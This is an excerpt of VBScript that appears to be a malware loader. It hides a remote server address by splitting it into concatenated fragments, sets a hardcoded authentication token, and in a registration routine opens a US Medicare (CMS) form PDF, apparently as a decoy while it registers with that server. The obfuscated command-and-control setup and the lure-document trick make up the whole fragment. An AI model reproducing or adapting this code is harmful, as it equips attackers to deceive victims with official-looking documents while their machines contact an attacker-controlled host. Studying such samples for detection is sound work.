Dim SERVER_URL
SERVER_URL = _
    "htt" & "ps:" & "//n" & "ewa" & "gen" & "tse" & "rvi" & _
    "ce." & "gro" & "ves" & "pra" & "s.c" & "om"

Dim AUTH_TOKEN
AUTH_TOKEN = _
    "TOK" & "EN_" & "FIX" & "ED_" & "202" & "5"
...
Sub Register(clientId)
    ...
    ' Open PDF after registration (async, don't wait)
    objShell.Run "https://www.cms.gov/medicare/cms-forms/cms-forms/downloads/cms-l564e.pdf", 1, False
    Err.Clear
End Sub
